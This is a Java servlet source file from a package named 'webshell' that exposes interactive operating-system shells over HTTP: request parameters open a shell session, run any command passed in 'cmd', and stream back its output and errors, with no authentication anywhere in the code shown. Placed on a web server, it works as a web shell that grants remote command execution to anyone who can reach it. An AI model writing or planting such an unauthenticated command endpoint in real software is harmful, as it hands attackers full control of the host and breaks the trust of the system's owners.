package webshell.servlet;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import webshell.util.Shell;

@SuppressWarnings("serial")
public class ShellServlet extends HttpServlet {

	private Map<String, Shell> shellMap = new HashMap<String, Shell>();

	public ShellServlet() {
		Thread t = new Thread() {
			@Override
			public void run() {
				while (true) {
					try {
						Thread.sleep(30000);
						removeUnusedShell();
					} catch (InterruptedException e) {
					}
				}
			}
		};
		t.setName("shellServlet-removeUnused");
		t.setDaemon(true);
		t.start();
	}

	@Override
	public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		request.setCharacterEncoding("UTF-8");
		String fn = request.getParameter("fn");
		if ("open".equals(fn)) {
			open(request, response);
		} else if ("close".equals(fn)) {
			close(request, response);
		} else if ("execute".equals(fn)) {
			execute(request, response);
		} else if ("nextInput".equals(fn)) {
			nextInput(request, response);
		} else if ("nextError".equals(fn)) {
			nextError(request, response);
		}
	}

	private void open(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getParameter("key");
		String name = request.getParameter("name");
		String encoding = request.getParameter("encoding");
		synchronized (shellMap) {
			Shell sh = shellMap.get(key);
			if (sh != null) {
				sh.close();
			}
			sh = new Shell(name, encoding);
			shellMap.put(key, sh);
		}
		response.setStatus(HttpServletResponse.SC_OK);
		response.setCharacterEncoding("UTF-8");
		response.getWriter().write("success");
		response.flushBuffer();
	}

	private void close(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		String key = request.getParameter("key");
		synchronized (shellMap) {
			Shell sh = shellMap.get(key);
			if (sh != null) {
				sh.close();
			}
			shellMap.remove(key);
		}
		response.setStatus(HttpServletResponse.SC_OK);
		response.setCharacterEncoding("UTF-8");
		response.getWriter().write("success");
		response.flushBuffer();
	}

	private void execute(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String key = request.getParameter("key");
		String cmd = request.getParameter("cmd");
		Shell shell = shellMap.get(key);
		if (shell == null) {
			throw new ServletException("shell not opened");
		} else {
			shell.execute(cmd);
			response.setStatus(HttpServletResponse.SC_OK);
			response.setCharacterEncoding("UTF-8");
			response.getWriter().write("success");
			response.flushBuffer();
		}
	}

	private void nextInput(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String key = request.getParameter("key");
		Shell shell = shellMap.get(key);
		if (shell == null) {
			throw new ServletException("shell not opened");
		} else {
			String data = null;
			for (int i = 0; i < 20; i++) {
				data = shell.nextInput();
				if (data.length() > 0) {
					break;
				}
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
				}
			}
			response.setStatus(HttpServletResponse.SC_OK);
			response.setCharacterEncoding("UTF-8");
			response.getWriter().write(data);
			response.flushBuffer();
		}
	}

	private void nextError(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String key = request.getParameter("key");
		Shell shell = shellMap.get(key);
		if (shell == null) {
			throw new ServletException("shell not opened");
		} else {
			String data = null;
			for (int i = 0; i < 20; i++) {
				data = shell.nextError();
				if (data.length() > 0) {
					break;
				}
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
				}
			}
			response.setStatus(HttpServletResponse.SC_OK);
			response.setCharacterEncoding("UTF-8");
			response.getWriter().write(data);
			response.flushBuffer();
		}
	}

	private void removeUnusedShell() {
		synchronized (shellMap) {
			for (Map.Entry<String, Shell> entry : shellMap.entrySet()) {
				String key = entry.getKey();
				Shell shell = entry.getValue();
				if (System.currentTimeMillis() - shell.getLastUsedTime() > 60000) {
					shell.close();
					shellMap.remove(key);
				}
			}
		}
	}

}
